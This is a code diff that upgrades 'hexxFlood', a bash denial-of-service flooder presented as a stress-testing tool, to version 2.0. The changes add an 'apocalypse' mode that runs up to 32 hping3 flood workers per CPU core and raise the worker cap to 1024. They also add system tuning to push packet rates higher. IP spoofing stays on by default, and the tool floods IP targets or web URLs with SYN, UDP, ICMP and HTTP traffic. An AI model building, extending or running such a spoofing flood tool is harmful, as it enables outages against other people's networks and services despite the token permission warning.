@@ -2,7 +2,7 @@
 
 # ============================================================
 # hexxFlood - Ultimate Network Stress Testing Tool
-# Version: 1.0
+# Version: 2.0  (full-power engine)
 # Author: Cywarx
 # ============================================================
 
@@ -14,10 +14,11 @@ BLUE='\033[0;34m'
 PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 WHITE='\033[1;37m'
+BOLD='\033[1m'
 NC='\033[0m'
 
 # Version
-VERSION="1.0"
+VERSION="2.0"
 REPO_URL="https://github.com/Cywarx/hexxFlood.git"
 
 # Configuration
@@ -32,11 +33,20 @@ SPOOF_IP=true
 RANDOM_PORTS=true
 TARGET_TYPE="ip"
 
+# System tuning — genuine, SAFE power levers that are captured and RESTORED on
+# exit. We deliberately do NOT touch MTU (jumbo frames break non-jumbo LANs),
+# turbo, hugepages or IRQ affinity: those either hurt throughput or leave the
+# box in a broken state. SYS_TUNE="" means "auto" (on for high/extreme/apocalypse).
+SYS_TUNE=""              # ""=auto, true=force on, false=off  (--tune / --no-tune)
+TX_QUEUE_LEN=10000       # NIC tx queue length while flooding (--tx-queue)
+
 # Monitoring
 AUTO_MONITOR=true        # auto-open a monitor terminal when an attack starts
 MONITOR_WINDOWS="full"   # comma-separated modes -> one auto window per mode
 MONITOR_MODE="full"      # mode used by standalone --monitor
 RUN_MONITOR_ONLY=false   # set by --monitor to run the monitor and exit
+
+declare -A SAVED_SYSCTL  # original sysctl values, restored on cleanup
 
 if [ -f "$CONFIG_FILE" ]; then
     source "$CONFIG_FILE"
@@ -58,8 +68,8 @@ show_banner() {
     echo "║   ██║  ██║███████╗██╔╝ ██╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝   ║"
     echo "║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ║"
     echo "║                                                                                ║"
-    echo "║                   Ultimate Network Stress Testing Tool v1.0                    ║"
-    echo "║                              IP & Web URL Support                              ║"
+    echo "║              ⚡ Ultimate Network Stress Testing Tool v2.0 ⚡                   ║"
+    echo "║                     Full-Power Engine · IP & Web URL                           ║"
     echo "║                                Use Responsibly!                                ║"
     echo "╠════════════════════════════════════════════════════════════════════════════════╣"
     echo "║                             Author: CyWarX                                     ║"
@@ -84,12 +94,19 @@ show_help() {
     echo "  -s, --size BYTES         Packet size (64-65495, default: 65495)"
     echo "  -d, --delay MS           Delay (u1,u10,u100, default: u1)"
     echo "  -i, --interface IFACE    Network interface (default: wlan0)"
-    echo "  -m, --mode MODE          Mode: easy|medium|high|extreme|custom"
+    echo "  -m, --mode MODE          Mode: easy|medium|high|extreme|apocalypse|custom"
     echo "  -P, --ports PORTS        Comma-separated ports"
     echo "  -T, --type TYPES         Types: syn,udp,icmp,ack,rst,fin,all,http"
     echo "  -D, --duration SEC       Duration in seconds (0=infinite)"
     echo "  --no-spoof               Disable IP spoofing"
     echo "  --fixed-ports            Use fixed ports"
+    echo ""
+    echo -e "${YELLOW}Performance Tuning (safe — restored on exit):${NC}"
+    echo "  --tune                   Force system tuning on (bigger tx-queue, socket"
+    echo "                           buffers, CPU governor=performance)"
+    echo "  --no-tune                Never touch system settings"
+    echo "  --tx-queue NUM           NIC tx queue length while flooding (default: 10000)"
+    echo "  (tip) HEXXFLOOD_WORKERS=N Force an exact, UNCAPPED parallel worker count"
     echo ""
     echo -e "${YELLOW}Monitoring Options:${NC}"
     echo "  --monitor                Open the live monitor only (no attack)"
@@ -104,15 +121,17 @@ show_help() {
     echo "  -h, --help               Show this help"
     echo ""
     echo -e "${YELLOW}Attack Modes:${NC}"
-    echo "  easy    - 10 threads, basic attacks"
-    echo "  medium  - 25 threads, medium attacks"
-    echo "  high    - 50 threads, high attacks"
-    echo "  extreme - 100 threads, extreme attacks"
-    echo "  custom  - Use your own settings"
+    echo "  easy       - 2× CPU cores of parallel floods, basic types"
+    echo "  medium     - 4× CPU cores, medium types"
+    echo "  high       - 8× CPU cores + system tuning, all TCP/UDP/ICMP"
+    echo "  extreme    - 16× CPU cores + system tuning, full power (auto-stop 60s)"
+    echo "  apocalypse - 32× CPU cores + system tuning, maximum overdrive (auto-stop 60s)"
+    echo "  custom     - Use your own settings"
     echo ""
     echo -e "${YELLOW}Examples:${NC}"
     echo "  # IP Attack"
     echo "  hexxFlood -t 192.168.1.10 -m extreme"
+    echo "  hexxFlood -t 192.168.1.10 -m apocalypse -D 60"
     echo ""
     echo "  # Web URL Attack"
     echo "  hexxFlood -u http://example.com -m extreme"
@@ -160,10 +179,10 @@ http_flood() {
     local url="$1"
     local threads="${2:-50}"
     local duration="${3:-0}"
-    
+
     echo -e "${YELLOW}🌐 Starting HTTP flood on $url${NC}"
     echo -e "${YELLOW}   Threads: $threads${NC}"
-    
+
     cat > /tmp/http_flood.py << 'PYEOF'
 import sys, time, threading, urllib.request, urllib.error, ssl, random
 from concurrent.futures import ThreadPoolExecutor
@@ -444,9 +463,12 @@ parse_args() {
             -m|--mode) MODE="$2"; shift 2 ;;
             -P|--ports) CUSTOM_PORTS="$2"; shift 2 ;;
             -T|--type) ATTACK_TYPES="$2"; shift 2 ;;
-            -D|--duration) ATTACK_DURATION="$2"; shift 2 ;;
+            -D|--duration) ATTACK_DURATION="$2"; DURATION_SET=1; shift 2 ;;
             --no-spoof) SPOOF_IP=false; shift ;;
             --fixed-ports) RANDOM_PORTS=false; shift ;;
+            --tune) SYS_TUNE=true; shift ;;
+            --no-tune) SYS_TUNE=false; shift ;;
+            --tx-queue) TX_QUEUE_LEN="$2"; shift 2 ;;
             --monitor) RUN_MONITOR_ONLY=true; shift ;;
             --monitor-mode) MONITOR_MODE="$2"; shift 2 ;;
             --auto-monitor)
@@ -464,10 +486,13 @@ parse_args() {
 
 set_mode() {
     case $MODE in
-        easy) THREADS=10; DELAY="u100"; ATTACK_TYPES="syn,udp,icmp" ;;
-        medium) THREADS=25; DELAY="u10"; ATTACK_TYPES="syn,udp,icmp,ack" ;;
-        high) THREADS=50; DELAY="u1"; ATTACK_TYPES="syn,udp,icmp,ack,rst,fin" ;;
-        extreme) THREADS=100; DELAY="u1"; ATTACK_TYPES="all" ;;
+        easy)       THREADS=10;  DELAY="u100"; ATTACK_TYPES="syn,udp,icmp" ;;
+        medium)     THREADS=25;  DELAY="u10";  ATTACK_TYPES="syn,udp,icmp,ack" ;;
+        high)       THREADS=50;  DELAY="u1";   ATTACK_TYPES="syn,udp,icmp,ack,rst,fin" ;;
+        # extreme/apocalypse auto-stop after 60s unless the user passed an
+        # explicit -D (including -D 0 for infinite), which always wins.
+        extreme)    THREADS=100; DELAY="u1";   ATTACK_TYPES="all"; [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60 ;;
+        apocalypse) THREADS=200; DELAY="u1";   ATTACK_TYPES="all"; [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60 ;;
         custom) ;;
         *) THREADS=50; ATTACK_TYPES="all" ;;
     esac
@@ -478,7 +503,7 @@ set_mode() {
 # NOT with process count. The old THREADS×types model (hundreds of procs) thrashed
 # the scheduler and overran the NIC TX queue (ENOBUFS) → it sent *less*. Here we
 # run many parallel floods for genuine full power:
-#   easy 2×  medium 4×  high 8×  extreme 16× cores.
+#   easy 2×  medium 4×  high 8×  extreme 16×  apocalypse 32× cores.
 # Set HEXXFLOOD_WORKERS=N to force an exact, UNCAPPED worker count yourself.
 compute_flood_workers() {
     local cores; cores=$(nproc 2>/dev/null); [[ "$cores" =~ ^[0-9]+$ ]] || cores=2
@@ -491,22 +516,85 @@ compute_flood_workers() {
         return
     fi
     case "${MODE:-custom}" in
-        easy)    FLOOD_WORKERS=$(( cores * 2 )) ;;
-        medium)  FLOOD_WORKERS=$(( cores * 4 )) ;;
-        high)    FLOOD_WORKERS=$(( cores * 8 )) ;;
-        extreme) FLOOD_WORKERS=$(( cores * 16 )) ;;
-        *)       FLOOD_WORKERS=$(( cores * 8 )) ;;   # custom
+        easy)       FLOOD_WORKERS=$(( cores * 2 )) ;;
+        medium)     FLOOD_WORKERS=$(( cores * 4 )) ;;
+        high)       FLOOD_WORKERS=$(( cores * 8 )) ;;
+        extreme)    FLOOD_WORKERS=$(( cores * 16 )) ;;
+        apocalypse) FLOOD_WORKERS=$(( cores * 32 )) ;;
+        *)          FLOOD_WORKERS=$(( cores * 8 )) ;;   # custom
     esac
     [ "$FLOOD_WORKERS" -lt 1 ] && FLOOD_WORKERS=1
     # Generous ceiling for the auto modes; use HEXXFLOOD_WORKERS to exceed it.
-    [ "$FLOOD_WORKERS" -gt 256 ] && FLOOD_WORKERS=256
+    [ "$FLOOD_WORKERS" -gt 1024 ] && FLOOD_WORKERS=1024
+}
+
+# Apply SAFE, RESTORABLE system tuning that genuinely lifts the real send rate:
+#   * a longer NIC tx queue      -> fewer ENOBUFS drops at high pps
+#   * larger kernel socket bufs  -> the flooders never stall on buffer limits
+#   * larger netdev backlog      -> the stack keeps up with the burst
+#   * CPU governor = performance -> clocks stay pinned high while flooding
+# Every value we change is captured first and put back verbatim by
+# restore_system_tuning() on exit. We intentionally avoid jumbo MTU, turbo
+# toggles, hugepages and IRQ affinity — those hurt throughput or corrupt state.
+apply_system_tuning() {
+    [ "$SYS_TUNE" = true ] || return 0
+    TUNING_APPLIED=1
+
+    # NIC tx queue length
+    if [ -f "/sys/class/net/$INTERFACE/tx_queue_len" ]; then
+        SAVED_TXQLEN=$(cat "/sys/class/net/$INTERFACE/tx_queue_len" 2>/dev/null)
+        sudo ip link set dev "$INTERFACE" txqueuelen "$TX_QUEUE_LEN" 2>/dev/null || true
+    fi
+
+    # Kernel socket buffers + device backlog
+    local k
+    for k in net.core.wmem_max net.core.rmem_max net.core.netdev_max_backlog; do
+        SAVED_SYSCTL["$k"]=$(sysctl -n "$k" 2>/dev/null)
+    done
+    sudo sysctl -qw net.core.wmem_max=134217728        2>/dev/null || true
+    sudo sysctl -qw net.core.rmem_max=134217728        2>/dev/null || true
+    sudo sysctl -qw net.core.netdev_max_backlog=250000 2>/dev/null || true
+
+    # CPU governor -> performance (assume uniform; cpu0 is representative)
+    if [ -f /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor ]; then
+        SAVED_GOVERNOR=$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null)
+        local g
+        for g in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
+            echo performance | sudo tee "$g" >/dev/null 2>&1 || true
+        done
+    fi
+
+    # Give this shell plenty of file descriptors for many parallel workers
+    ulimit -n 65535 2>/dev/null || true
+
+    echo -e "${GREEN}⚙️  System tuning applied${NC} (tx-queue ${TX_QUEUE_LEN}, socket buffers, performance governor) — ${YELLOW}restored on exit${NC}"
+}
+
+# Put every tuned value back exactly as it was. No-op if tuning never ran.
+restore_system_tuning() {
+    [ "${TUNING_APPLIED:-0}" = 1 ] || return 0
+
+    [ -n "${SAVED_TXQLEN:-}" ] && \
+        sudo ip link set dev "$INTERFACE" txqueuelen "$SAVED_TXQLEN" 2>/dev/null || true
+
+    local k
+    for k in "${!SAVED_SYSCTL[@]}"; do
+        [ -n "${SAVED_SYSCTL[$k]}" ] && sudo sysctl -qw "$k=${SAVED_SYSCTL[$k]}" 2>/dev/null || true
+    done
+
+    if [ -n "${SAVED_GOVERNOR:-}" ]; then
+        local g
+        for g in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
+            echo "$SAVED_GOVERNOR" | sudo tee "$g" >/dev/null 2>&1 || true
+        done
+    fi
 }
 
 # Launch ONE silent hping3 --flood worker for a type/port. NOTE: we deliberately
 # do NOT pin with taskset — pinning the flood loops can starve the kernel's own
 # network-transmit softirqs on those cores and cap the real send rate. Letting
 # the scheduler place them freely gives higher throughput. --flood transmits as
-# fast as possible and ignores -i, so no interval is passed.
+# fast as possible and ignores -i; we never pass -c so each worker floods forever.
 launch_flood() {
     local t="$1" p="$2"
     case "$t" in
@@ -759,6 +847,9 @@ cleanup() {
     rm -f /tmp/http_flood.py "${HPING_LOG:-/tmp/hexxflood_hping.log}" 2>/dev/null
     wait 2>/dev/null
 
+    # Put any tuned NIC / kernel / CPU settings back exactly as we found them.
+    restore_system_tuning
+
     # Final stats (if the attack actually started)
     local elapsed=0 total=0 avg=0
     if [ -n "${ATTACK_START_TIME:-}" ]; then
@@ -791,6 +882,7 @@ cleanup() {
     pl "   ${GREEN}✔${NC}  hping3 flood processes terminated"
     pl "   ${GREEN}✔${NC}  HTTP flood terminated"
     pl "   ${GREEN}✔${NC}  Temporary files removed"
+    [ "${TUNING_APPLIED:-0}" = 1 ] && pl "   ${GREEN}✔${NC}  System settings restored"
     pl ""
     if [ -n "${ATTACK_START_TIME:-}" ]; then
         pl "   ${YELLOW}📊 Final Statistics${NC}"
@@ -830,8 +922,19 @@ main() {
     if ! [[ "$PACKET_SIZE" =~ ^[0-9]+$ ]] || [ "$PACKET_SIZE" -lt 64 ] || [ "$PACKET_SIZE" -gt 65495 ]; then
         echo -e "${RED}❌ Packet size must be between 64 and 65495${NC}"; exit 1
     fi
+    if ! [[ "$TX_QUEUE_LEN" =~ ^[0-9]+$ ]] || [ "$TX_QUEUE_LEN" -lt 1 ]; then
+        echo -e "${RED}❌ --tx-queue must be a positive number${NC}"; exit 1
+    fi
     if ! ifconfig "$INTERFACE" &>/dev/null; then
         echo -e "${YELLOW}⚠️  Interface '$INTERFACE' not found — packet stats may show 0. Use -i to set the right one.${NC}"
+    fi
+
+    # Resolve "auto" system tuning: on for the heavy modes, off otherwise.
+    if [ -z "$SYS_TUNE" ]; then
+        case "${MODE:-custom}" in
+            high|extreme|apocalypse) SYS_TUNE=true ;;
+            *)                       SYS_TUNE=false ;;
+        esac
     fi
 
     # Expand the "all" shortcut now so the config display and pool sizing see the
@@ -847,6 +950,7 @@ main() {
     echo "  Attack Types: ${ATTACK_TYPES:-all}"
     echo "  Packet Size: $PACKET_SIZE bytes"
     echo -e "  Flood Power: ${GREEN}${FLOOD_WORKERS}${NC} parallel hping3 --flood workers (${CORES} CPU cores)$([ "${WORKERS_FORCED:-0}" = 1 ] && echo " (forced)")"
+    echo "  System Tuning: $([ "$SYS_TUNE" = true ] && echo "on (restored on exit)" || echo "off")"
     echo "  Duration: ${ATTACK_DURATION:-Infinite}"
     echo ""
     echo -e "${RED}⚠️ WARNING: Use only on networks you OWN or have permission to test!${NC}"
@@ -862,6 +966,9 @@ main() {
     # session with no controlling tty; fall back gracefully if unavailable.
     DETACH="setsid"; command -v setsid >/dev/null 2>&1 || DETACH=""
 
+    # Apply safe, restorable system tuning (only when enabled) BEFORE launching.
+    apply_system_tuning
+
     # Auto-open monitor terminal(s) so progress is visible while the attack runs
     launch_monitors
 
@@ -871,7 +978,7 @@ main() {
         echo -e "${GREEN}✅ HTTP flood started${NC}"
         echo ""
     fi
-    
+
     if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),'; then
         echo -e "${GREEN}Starting network layer attack on $TARGET...${NC}"
         echo -e "${GREEN}⚡ ${FLOOD_WORKERS} flood workers across ${CORES} cores — full power${NC}"
